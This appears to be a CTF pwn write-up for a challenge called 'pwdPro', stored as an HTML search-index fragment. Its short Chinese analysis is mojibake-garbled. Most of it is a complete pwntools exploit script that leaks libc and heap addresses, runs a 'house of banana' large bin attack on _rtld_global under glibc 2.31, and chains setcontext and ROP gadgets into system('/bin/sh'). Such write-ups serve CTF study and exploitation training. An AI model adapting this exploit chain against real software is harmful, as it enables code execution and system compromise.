<h3 id="é¢˜ç›®åˆ†æ-v3"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v3">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>åŠŸèƒ½ä¸FreeVersion ç›¸ä¼¼ï¼Œå¤šäº†å®Œæ•´çš„editå’Œshow,ä»¥åŠä¸€ä¸ªrecoverå¯ä»¥æ¢å¤è¢«é‡Šæ”¾æ‰çš„å †å—</p>
<p>ä½†æ˜¯é¢˜ç›®æ‰€ç»™çš„libcç‰ˆæœ¬ä½2.31ï¼Œä¸”ç¨‹åºèƒ½å¤Ÿæ˜¾å¼çš„æ‰§è¡Œexitå‡½æ•°ï¼Œè¿™å°±æƒ³åˆ°äº†ha1vkå¸ˆå‚…æå‡ºçš„é«˜ç‰ˆæœ¬glibcçš„åˆ©ç”¨æ–¹å¼ï¼Œhouse of banana(é“¾æ¥ï¼šâ€œ<a href="https://www.anquanke.com/post/id/222948?display=mobile">https://www.anquanke.com/post/id/222948?display=mobile</a>â€)</p>
<p>ç„¶åå°±æ˜¯ä¸€æ³¢ä¾è‘«èŠ¦ç”»ç“¢</p>
<h3 id="EXP-v3"><a class="header-anchor" href="#EXP-v3">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;pwdPro&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdPro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">ld = ELF(<span class="string">&#x27;ld-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Add&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Edit:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Recover&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x428</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x500</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x500</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#5</span></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ec010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rtl_global = libc_base + <span class="number">0x1f4000</span> + ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x3D</span></span><br><span class="line">ret = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x14E</span></span><br><span class="line">pop_rdi_rbp_ret = libc_base + <span class="number">0x00000000000276e9</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1b75aa</span></span><br><span class="line">system_addr =  libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_addr = (u64(p.recv(<span class="number">8</span>))^key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(rtl_global - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>,<span class="string">b&#x27;large bin attack!!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(rtl_global+<span class="number">0x221730</span>-<span class="number">0x220060</span>+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(heap_addr + <span class="number">0x960</span>)</span><br><span class="line">payload += p64(set_context) + p64(ret)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x28</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_rbp_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x10</span> + <span class="number">0x110</span>)*<span class="number">0x3</span></span><br><span class="line">payload += p64(<span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x31C</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x420</span> + p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
